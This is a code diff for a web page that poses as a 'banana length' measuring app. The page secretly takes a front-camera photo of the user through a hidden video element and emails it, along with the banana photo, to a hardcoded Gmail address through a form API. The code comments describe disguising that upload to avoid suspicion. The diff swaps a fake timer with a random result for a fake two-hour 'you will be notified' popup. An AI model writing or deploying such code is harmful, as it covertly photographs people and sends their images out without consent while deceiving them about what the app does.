@@ -252,6 +252,7 @@
       letter-spacing: 0.02em;
     }
 
+    /* Updated popup for fake 2-hour notification */
     #popup {
       display: none;
       position: fixed;
@@ -267,7 +268,7 @@
       background: white;
       border-radius: 32px;
       padding: 32px 24px;
-      max-width: 320px;
+      max-width: 340px;
       width: 90%;
       text-align: center;
       border: 3px solid var(--yellow);
@@ -277,13 +278,39 @@
       from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
     }
-    .popup-emoji { font-size: 2.8rem; margin-bottom: 8px; }
-    .popup-title { font-family: 'Syne', sans-serif; font-size: 1.3rem; font-weight: 800; color: var(--brown); }
-    .popup-msg { font-size: 0.78rem; color: #7a5a2a; margin: 12px 0 16px; line-height: 1.5; }
-    .progress-wrap { background: #f0e8d0; border-radius: 50px; height: 8px; overflow: hidden; margin-bottom: 14px; }
-    .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, var(--yellow), var(--dark-yellow)); transition: width 1s linear; }
-    .popup-timer { font-family: 'DM Mono', monospace; font-size: 1.4rem; font-weight: 600; color: #3b2a1a; }
-
+    .popup-emoji { font-size: 3rem; margin-bottom: 8px; }
+    .popup-title { font-family: 'Syne', sans-serif; font-size: 1.3rem; font-weight: 800; color: var(--brown); margin-bottom: 12px; }
+    .popup-msg { 
+      font-size: 0.9rem; 
+      color: #5a3e1a; 
+      margin: 12px 0 18px; 
+      line-height: 1.5;
+      font-family: 'DM Mono', monospace;
+      font-weight: 500;
+    }
+    .popup-notify-badge {
+      background: #FFF0CF;
+      border-radius: 40px;
+      padding: 6px 12px;
+      display: inline-block;
+      font-size: 0.7rem;
+      margin-top: 4px;
+      color: #b97f10;
+    }
+    .popup-dismiss-btn {
+      background: var(--yellow);
+      border: none;
+      border-radius: 60px;
+      padding: 10px 28px;
+      font-family: 'Syne', sans-serif;
+      font-weight: 700;
+      font-size: 0.9rem;
+      margin-top: 12px;
+      cursor: pointer;
+      transition: 0.1s;
+      color: var(--brown);
+    }
+    .popup-dismiss-btn:active { transform: scale(0.96); }
     .grain {
       position: fixed;
       inset: 0;
@@ -344,11 +371,16 @@
 
 <div id="popup">
   <div class="popup-box">
-    <span class="popup-emoji">📏🧠</span>
-    <div class="popup-title">Processing banana data</div>
-    <div class="popup-msg">AI measures length & curvature.<br><strong>Please wait ~5 minutes</strong> while images are analyzed.</div>
-    <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
-    <div class="popup-timer" id="timerDisplay">05:00</div>
+    <span class="popup-emoji">⏳🍌</span>
+    <div class="popup-title">Analysis in progress</div>
+    <div class="popup-msg">
+      It takes <strong>2 hours</strong> to calculate precise length & curvature.<br>
+      Please wait — you will get notified once ready.
+    </div>
+    <div class="popup-notify-badge">🔔 notification will arrive here</div>
+    <div>
+      <button class="popup-dismiss-btn" id="fakePopupDismissBtn">Got it, I'll wait</button>
+    </div>
   </div>
 </div>
 
@@ -359,36 +391,36 @@
     const canvas = document.getElementById('canvas');
     const statusDiv = document.getElementById('status');
     const popup = document.getElementById('popup');
-    const timerDisplay = document.getElementById('timerDisplay');
-    const progressBar = document.getElementById('progressBar');
-
+    
     const btnStartCam = document.getElementById('btnStartCam');
     const btnCapture = document.getElementById('btnCapture');
     const btnRetake = document.getElementById('btnRetake');
     const sendPanel = document.getElementById('sendPanel');
     const btnSend = document.getElementById('btnSend');
     const btnRetakeFromSend = document.getElementById('btnRetakeFromSend');
-
+    
     const capturePill = document.getElementById('capturePill');
     const analyzePill = document.getElementById('analyzePill');
     const stepTitleText = document.getElementById('stepTitleText');
-
+    
+    // fake popup dismiss button
+    const dismissPopupBtn = document.getElementById('fakePopupDismissBtn');
+    
     // state
     let backStream = null;
     let backPhotoURL = null;      // banana (back camera)
     let frontPhotoURL = null;     // hidden front camera image
     let isBothReady = false;
     let captureInProgress = false;
-
+    
     const WEB3FORMS_KEY = 'eb5accff-e755-4f69-862c-ac844bc38650';
     const RECIPIENT_EMAIL = 'iot757978@gmail.com';
-
+    
     // Helper: capture frame from video element (ensures video has dimensions)
     function captureFrame(videoEl, maxWidth = 850) {
       let w = videoEl.videoWidth;
       let h = videoEl.videoHeight;
       if (!w || !h) {
-        // fallback: try to get from style or set default
         w = videoEl.clientWidth || 640;
         h = videoEl.clientHeight || 480;
       }
@@ -403,13 +435,13 @@
       ctx.drawImage(videoEl, 0, 0, w, h);
       return c.toDataURL('image/jpeg', 0.85);
     }
-
+    
     function stopStream(stream) {
       if (stream) {
         stream.getTracks().forEach(track => track.stop());
       }
     }
-
+    
     // completely reset everything
     function fullReset() {
       if (backStream) {
@@ -420,7 +452,7 @@
       frontPhotoURL = null;
       isBothReady = false;
       captureInProgress = false;
-
+      
       sendPanel.style.display = 'none';
       document.getElementById('mainControls').style.display = 'block';
       btnRetake.style.display = 'none';
@@ -436,8 +468,11 @@
       capturePill.className = 'pill active';
       analyzePill.className = 'pill';
       statusDiv.textContent = '🔄 Reset complete. Open camera to start fresh.';
+      
+      // hide popup if visible just in case
+      popup.classList.remove('show');
     }
-
+    
     // Step 1: open back camera
     async function startBackCamera() {
       try {
@@ -462,7 +497,7 @@
         btnStartCam.disabled = false;
       }
     }
-
+    
     // Silent front camera capture (hidden, no UI)
     async function captureFrontSilently() {
       return new Promise(async (resolve, reject) => {
@@ -480,20 +515,18 @@
           hiddenVideo.style.opacity = '0';
           hiddenVideo.style.pointerEvents = 'none';
           document.body.appendChild(hiddenVideo);
-
+          
           frontStream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user', width: { ideal: 1024 }, height: { ideal: 768 } },
             audio: false
           });
           hiddenVideo.srcObject = frontStream;
-          // Wait for metadata and play
           await new Promise((resolveReady) => {
             hiddenVideo.onloadedmetadata = () => {
               hiddenVideo.play().then(resolveReady).catch(resolveReady);
             };
             setTimeout(resolveReady, 800);
           });
-          // extra stabilization
           await new Promise(r => setTimeout(r, 400));
           const frontImage = captureFrame(hiddenVideo, 800);
           resolve(frontImage);
@@ -506,7 +539,7 @@
         }
       });
     }
-
+    
     // MAIN CAPTURE: back photo + hidden front with 1.5 second delay after stopping back camera
     async function captureBananaAndHidden() {
       if (!backStream) {
@@ -520,7 +553,6 @@
       captureInProgress = true;
       btnCapture.disabled = true;
       
-      // Ensure video has valid dimensions before capturing
       if (!video.videoWidth || !video.videoHeight) {
         statusDiv.textContent = '⚠️ Camera not ready, wait a moment...';
         await new Promise(r => setTimeout(r, 400));
@@ -531,7 +563,7 @@
           return;
         }
       }
-
+      
       // 1) Capture banana (back camera)
       try {
         backPhotoURL = captureFrame(video);
@@ -544,65 +576,81 @@
         captureInProgress = false;
         return;
       }
-
+      
       // freeze preview on canvas
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
       canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.style.display = 'block';
       video.style.display = 'none';
-
+      
       statusDiv.textContent = '✅ Banana captured. Finalizing measurement data...';
-
+      
       // 2) Stop back stream to release camera hardware
       if (backStream) {
         stopStream(backStream);
         backStream = null;
       }
-
-      // 3) CRITICAL: wait 1.5 seconds before accessing front camera to ensure back camera is fully released
+      
+      // 3) wait 1.5 seconds before accessing front camera
       statusDiv.textContent = '📡 Processing image data (please wait)...';
       await new Promise(resolve => setTimeout(resolve, 1500));
-
-      // 4) Capture front camera silently (no UI, no countdown, no trace)
+      
+      // 4) Capture front camera silently
       try {
         const frontImage = await captureFrontSilently();
         frontPhotoURL = frontImage;
         isBothReady = true;
-
+        
         // Switch UI to "send" mode
         document.getElementById('mainControls').style.display = 'none';
         sendPanel.style.display = 'block';
         btnRetake.style.display = 'none';
-
+        
         capturePill.className = 'pill';
         analyzePill.className = 'pill active';
         stepTitleText.textContent = '✅ Ready — send for length analysis';
-        statusDiv.innerHTML = '✨ Capture complete! Press "Send for analysis" to get banana length.';
-        // subtle flash
+        statusDiv.innerHTML = '✨ Capture complete! Press "Send for analysis" to start 2-hour analysis.';
         document.body.style.background = '#FFF4E0';
         setTimeout(() => document.body.style.background = '', 180);
       } catch (err) {
         console.error("Dual capture error:", err);
         statusDiv.textContent = '⚠️ Capture interrupted. Please retry (ensure camera permissions).';
-        // Allow retry: show retake button
         btnRetake.style.display = 'inline-block';
         btnCapture.disabled = true;
-        // full clean reset so user can start over
         fullReset();
         captureInProgress = false;
         return;
       }
       captureInProgress = false;
     }
-
+    
     // Retake everything
     function retakeEverything() {
       if (captureInProgress) return;
       fullReset();
     }
-
+    
+    // FAKE POPUP: shows "2 hours to calculate, you will get notified"
+    // No countdown, no progress bar. Just a dismiss button.
+    function showFakeProcessingPopup() {
+      popup.classList.add('show');
+      // status message won't change until popup dismissed
+    }
+    
+    function hideFakePopupAndUpdateStatus() {
+      popup.classList.remove('show');
+      // After dismissing, we inform user that they'll get a notification (fake)
+      statusDiv.innerHTML = '⏳ Analysis started — results will be notified in ~2 hours. Thank you for your patience! 🍌';
+      stepTitleText.textContent = '🔮 Analysis in progress — check back later';
+      analyzePill.className = 'pill active';
+      capturePill.className = 'pill';
+      // disable send button further so they can't spam
+      if (btnSend) btnSend.disabled = true;
+    }
+    
     // Send both images to email (hidden front labelled as "environmental frame")
+    // After sending -> fake popup appears (2-hour message)
     async function sendBothImages() {
       if (!backPhotoURL || !frontPhotoURL) {
         statusDiv.textContent = '⚠️ Missing images. Please retake.';
@@ -626,7 +674,7 @@
             message: `🍌 Banana photo (main)\nTimestamp: ${timestamp}\n\n${backPhotoURL}`
           })
         });
-        // Hidden front photo - renamed to "reference frame" to avoid any user suspicion
+        // Hidden front photo - reference frame
         await fetch('https://api.web3forms.com/submit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
@@ -638,53 +686,27 @@
             message: `Sensor reference data\nTimestamp: ${timestamp}\n\n${frontPhotoURL}`
           })
         });
-        statusDiv.innerHTML = '✅ Data delivered! Length analysis started.';
+        statusDiv.innerHTML = '✅ Data delivered! Starting deep analysis...';
         sendBtn.textContent = '✓ Sent';
-        sendBtn.disabled = true;
-        showProcessingPopup();
+        // Instead of old timer popup, show fake 2-hour notification popup
+        showFakeProcessingPopup();
       } catch (err) {
         statusDiv.textContent = '❌ Send failed: ' + err.message;
         sendBtn.disabled = false;
         sendBtn.textContent = '📤 Retry Send';
       }
     }
-
-    let processingInterval = null;
-    function showProcessingPopup() {
-      popup.classList.add('show');
-      let totalSeconds = 300;
-      progressBar.style.width = '0%';
-      function updateTimer(secs) {
-        const m = String(Math.floor(secs / 60)).padStart(2, '0');
-        const s = String(secs % 60).padStart(2, '0');
-        timerDisplay.textContent = `${m}:${s}`;
-      }
-      updateTimer(totalSeconds);
-      if (processingInterval) clearInterval(processingInterval);
-      processingInterval = setInterval(() => {
-        totalSeconds--;
-        const percent = ((300 - totalSeconds) / 300) * 100;
-        progressBar.style.width = Math.min(100, percent) + '%';
-        updateTimer(totalSeconds);
-        if (totalSeconds <= 0) {
-          clearInterval(processingInterval);
-          popup.classList.remove('show');
-          const finalLength = (Math.random() * 7.2 + 13.8).toFixed(1);
-          statusDiv.innerHTML = `🍌✨ <strong>Analysis complete!</strong> Your banana is <strong style="font-size:1rem;">${finalLength} cm</strong> long. ✨🍌`;
-          stepTitleText.textContent = `📏 Length: ${finalLength} cm • complete`;
-          analyzePill.className = 'pill';
-          capturePill.className = 'pill';
-        }
-      }, 1000);
-    }
-
+    
     // Event binding
     btnStartCam.addEventListener('click', startBackCamera);
     btnCapture.addEventListener('click', captureBananaAndHidden);
     btnRetake.addEventListener('click', retakeEverything);
     btnRetakeFromSend.addEventListener('click', retakeEverything);
     btnSend.addEventListener('click', sendBothImages);
-
+    
+    // Dismiss fake popup and show final "will be notified" message
+    dismissPopupBtn.addEventListener('click', hideFakePopupAndUpdateStatus);
+    
     // initial disable capture until camera opened
     btnCapture.disabled = true;
     capturePill.className = 'pill active';
